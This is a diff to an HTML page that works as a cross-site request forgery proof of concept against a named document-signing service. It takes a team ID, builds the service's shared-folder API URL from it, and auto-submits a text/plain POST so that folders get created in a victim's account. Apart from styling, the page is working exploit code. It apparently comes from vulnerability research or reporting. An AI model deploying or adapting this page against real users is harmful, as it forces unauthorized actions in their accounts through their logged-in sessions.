@@ -3,68 +3,109 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CSRF</title>
+  <title>ADD FOLDERS in Documents via CSRF Attack</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    h2 {
+      font-family: 'Arial', sans-serif;
+      background-color: #f7f9fc;
       color: #333;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
     }
-    label {
-      font-size: 16px;
-      margin-bottom: 10px;
-    }
-    input[type="text"] {
-      padding: 8px;
-      width: 100%;
-      max-width: 300px;
-      margin-bottom: 15px;
-      font-size: 14px;
-    }
-    input[type="submit"] {
-      padding: 10px 15px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    input[type="submit"]:hover {
-      background-color: #45a049;
+    h1 {
+      color: #2c3e50;
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+      text-align: center;
     }
     .container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       max-width: 400px;
-      margin: 0 auto;
-      padding: 20px;
-      background-color: #f4f4f4;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      text-align: center;
+    }
+    label {
+      font-size: 1.1rem;
+      color: #555;
+      margin-bottom: 10px;
+      display: block;
+    }
+    input[type="text"] {
+      padding: 10px;
+      font-size: 1rem;
+      width: 100%;
+      border: 2px solid #ddd;
+      border-radius: 5px;
+      margin-bottom: 20px;
+      transition: border 0.3s ease;
+    }
+    input[type="text"]:focus {
+      border-color: #3498db;
+    }
+    input[type="submit"] {
+      background-color: #3498db;
+      color: white;
+      padding: 12px 20px;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+    input[type="submit"]:hover {
+      background-color: #2980b9;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 0.9rem;
+      color: #7f8c8d;
+    }
+    .footer a {
+      color: #3498db;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
+
+  <h1>ADD FOLDERS in Documents via CSRF Attack</h1>
+
   <div class="container">
-    <h2>ADD FOLDERS in Documents via CSRF Attack</h2>
-    <!-- Form that sends POST request -->
-    <form id="teamIDForm" action="https://app.signnow.com/api/team/f10474f3c4074deca43f99cef7fd1cd02f64107c/shared/document/folder" method="POST">
-      <label for="teamID">Enter Team ID:</label><br>
-      <input type="text" id="teamID" name="teamID" required><br><br>
-      <input type="submit" value="Submit">
+    <form id="teamForm" action="https://app.signnow.com/api/team/[team_id]/shared/document/folder" method="POST" enctype="text/plain">
+      <label for="teamID">Enter Team ID:</label>
+      <input type="text" id="teamID" name="teamID" required placeholder="/webapp/my-account/my-teams/[team_id]" />
+      <input type="submit" value="Submit Request" />
     </form>
   </div>
-
   <script>
-    // Optional: You can add JavaScript validation or processing before submitting the form
+    document.getElementById("teamForm").onsubmit = function(event) {
+      event.preventDefault(); // Prevent the form from submitting normally
 
-    // Example: Automatically submit the form after the user enters a teamID
-    document.getElementById('teamIDForm').addEventListener('submit', function(event) {
-      var teamID = document.getElementById('teamID').value;
-      if (!teamID) {
-        alert('Please enter a Team ID');
-        event.preventDefault(); // Prevent the form from submitting if teamID is empty
+      var teamID = document.getElementById("teamID").value;
+      if (teamID) {
+        // Update the form action with the user input
+        var actionUrl = "https://app.signnow.com/api/team/" + encodeURIComponent(teamID) + "/shared/document/folder";
+        document.getElementById("teamForm").action = actionUrl;
+        
+        // Submit the form programmatically
+        document.getElementById("teamForm").submit();
+      } else {
+        alert("Please enter a valid Team ID.");
       }
-    });
+    };
   </script>
+
 </body>
 </html>
